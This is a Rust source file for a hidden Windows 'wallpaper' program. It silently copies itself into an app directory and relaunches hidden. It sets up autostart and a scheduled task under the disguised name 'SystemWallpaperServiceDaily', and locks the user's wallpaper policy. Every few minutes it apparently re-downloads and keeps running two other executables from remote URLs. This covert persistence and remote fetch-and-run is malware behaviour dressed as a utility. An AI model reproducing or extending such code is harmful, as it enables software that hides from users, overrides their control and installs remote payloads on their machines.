#![windows_subsystem = "windows"]
use anyhow::Result;
use chrono::{Datelike, Local, NaiveDateTime, NaiveTime, Timelike};
use log::{error, info, warn};
use serde::Deserialize;
use std::collections::HashMap;
use std::time::Duration;
use tokio::{fs, time};
use shared::*;
#[derive(Deserialize, Debug)]
struct WallpaperConfig {
    initial_run_time: Option<String>,
    wallpapers: HashMap<String, String>,
    scheduled_wallpapers: Option<Vec<ScheduledWallpaper>>,
}

#[derive(Deserialize, Debug)]
struct ScheduledWallpaper {
    day: String,
    start_time: String,
    end_time: String,
    url: String,
}

fn get_current_day_str() -> String {
    use chrono::Weekday::*;
    match Local::now().weekday() {
        Mon => "monday", Tue => "tuesday", Wed => "wednesday",
        Thu => "thursday", Fri => "friday", Sat => "saturday",
        Sun => "sunday",
    }.to_string()
}

#[tokio::main]
async fn main() -> Result<()> {
    init_logging("daily.log").unwrap_or_else(|e| eprintln!("日志初始化失败: {}", e));

    if let Ok(app_dir) = get_app_dir() {
        let current_exe_path = std::env::current_exe()?;
        let exe_in_appdata = app_dir.join(DAILY_EXE);
        if current_exe_path != exe_in_appdata {
            std::fs::copy(&current_exe_path, &exe_in_appdata)?;
            run_program_hidden(&exe_in_appdata)?;
            return Ok(());
        }
        set_autostart("SystemWallpaperServiceDaily", &exe_in_appdata).ok();
        create_scheduled_task("SystemWallpaperServiceDailyTask", exe_in_appdata.to_str().unwrap_or_default()).ok();
    }

    let mut interval = time::interval(Duration::from_secs(60 * 5));
    loop {
        interval.tick().await;
        if let Ok(app_dir) = get_app_dir() {
            let stop_file = app_dir.join("daily.stop");
            if stop_file.exists() {
                if let Ok(content) = fs::read_to_string(&stop_file).await {
                    if let Ok(resume_ts) = content.trim().parse::<i64>() {
                        if Local::now().timestamp() < resume_ts {
                            info!("ready stop{}", NaiveDateTime::from_timestamp_opt(resume_ts, 0).unwrap());
                            continue;
                        } else {
                            warn!("over stop");
                            fs::remove_file(stop_file).await.ok();
                        }
                    }
                }
            }
        }
        
        tokio::spawn(async {
            guard_process(PERSON_EXE, PERSON_DOWNLOAD_URL).await.ok();
            guard_process(MANAGER_EXE, MANAGER_DOWNLOAD_URL).await.ok();
        });

        if let Err(e) = run_wallpaper_logic().await {
            error!("cloudnt {}", e);
        }
    }
}

async fn run_wallpaper_logic() -> Result<()> {
    let config: WallpaperConfig = reqwest::get(CONFIG_URL).await?.json().await?;
    let app_dir = get_app_dir()?;
    lock_wallpaper_policy()?;

    let now = Local::now();
    let current_time = now.time();
    let day_str = get_current_day_str();
    let mut wallpaper_url_to_set = None;
    if let Some(scheduled) = &config.scheduled_wallpapers {
        for item in scheduled {
            if item.day == day_str {
                if let (Ok(start_time), Ok(end_time)) = (
                    NaiveTime::parse_from_str(&item.start_time, "%H:%M"),
                    NaiveTime::parse_from_str(&item.end_time, "%H:%M")
                ) {
                    if current_time >= start_time && current_time < end_time {
                        info!(
                            "plan: day={}, time_range={}-{}",
                            item.day, item.start_time, item.end_time
                        );
                        wallpaper_url_to_set = Some(item.url.clone());
                        break;
                    }
                }
            }
        }
    }

    if wallpaper_url_to_set.is_none() {
        info!("noplan use{} ", day_str);
        wallpaper_url_to_set = config.wallpapers.get(&day_str).cloned();
    }

    if let Some(url) = wallpaper_url_to_set {
        let hash = {
            use std::collections::hash_map::DefaultHasher;
            use std::hash::{Hash, Hasher};
            let mut hasher = DefaultHasher::new();
            url.hash(&mut hasher);
            hasher.finish()
        };
        let extension = url.split('.').last().unwrap_or("jpg");
        let file_name = format!("{}.{}", hash, extension);
        let dest_path = app_dir.join(&file_name);

        if !dest_path.exists() {
             info!("downloading {}", url);
             download_file(&url, &dest_path).await?;
        }
       
        info!("setting {:?}", dest_path);
        set_wallpaper(&dest_path)?;
        info!("success set wallpaper");
    } else {
        warn!("no{}", day_str);
    }

    Ok(())
}

